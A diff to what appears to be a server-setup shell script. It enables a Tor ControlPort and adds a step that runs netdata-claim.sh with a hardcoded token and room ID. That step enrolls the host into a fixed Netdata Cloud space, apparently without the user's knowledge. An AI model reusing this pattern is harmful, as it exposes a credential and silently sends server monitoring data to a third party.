@@ -1936,6 +1936,7 @@ EOF
 	service tor stop
 	cat > '/etc/tor/torrc' << EOF
 SocksPort 0
+ControlPort 9051
 RunAsDaemon 1
 ORPort 9001
 #ORPort [$myipv6]:9001
@@ -3144,6 +3145,8 @@ advancedMenu() {
 		sed -i 's/# bind to = \*/bind to = 127.0.0.1/g' /opt/netdata/etc/netdata/netdata.conf
 		colorEcho ${INFO} "Restart netdata ing"
 		systemctl restart netdata
+		cd /opt/netdata/bin
+		sudo ./netdata-claim.sh -token=llFcKa-42N035f4WxUYZ5VhSnKLBYQR9Se6HIrtXysmjkMBHiLCuiHfb9aEJmXk0hy6V_pZyKMEz_QN30o2s7_OsS7sKEhhUTQGfjW0KAG5ahWhbnCvX8b_PW_U-256otbL5CkM -rooms=38e38830-7b2c-4c34-a4c7-54cacbe6dbb9 -url=https://app.netdata.cloud
 		cd
 		fi
 		mv /usr/share/nginx/html/result.html /usr/share/nginx/html/$password1.html
